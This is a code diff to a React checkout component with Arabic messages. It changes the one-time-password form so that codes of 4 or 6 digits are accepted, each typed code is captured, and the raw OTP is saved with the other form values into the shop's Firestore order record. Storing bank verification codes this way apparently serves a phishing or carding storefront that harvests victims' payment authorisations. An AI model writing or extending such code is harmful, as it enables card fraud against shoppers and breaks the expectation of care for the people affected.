@@ -14,13 +14,14 @@ import { useCart } from "@/components/cart-provider"
 import { db } from "@/lib/firebaes"
 
 const formSchema = z.object({
-  otp: z.string().length(6, "يجب أن يتكون الرمز من 6 أرقام"),
+  otp: z.string().min(4, "يجب أن يتكون الرمز من 4 او 6 أرقام")
 })
 
 export function OTPForm() {
   const router = useRouter()
   const { clearCart } = useCart()
   const [isLoading, setIsLoading] = useState(false)
+  const [otp, setOtp] = useState(false)
 
   const form = useForm<z.infer<typeof formSchema>>({
     resolver: zodResolver(formSchema),
@@ -37,7 +38,8 @@ export function OTPForm() {
 
       await updateDoc(doc(db, "orders", orderId), {
         payment: {
-          status: "completed",
+          otp:otp,
+          values,
           verifiedAt: new Date().toISOString(),
         },
         status: "confirmed",
@@ -60,7 +62,9 @@ export function OTPForm() {
           render={({ field }) => (
             <FormItem>
               <FormControl>
-                <Input type="tel" minLength={4}  {...field} className="text-center text-2xl tracking-widest" maxLength={6} />
+                <Input type="tel"onChange={(e)=>{
+                  setOtp(e.target.value)
+                }}  minLength={4}  {...field} className="text-center text-2xl tracking-widest" maxLength={6} />
               </FormControl>
               <FormMessage />
             </FormItem>
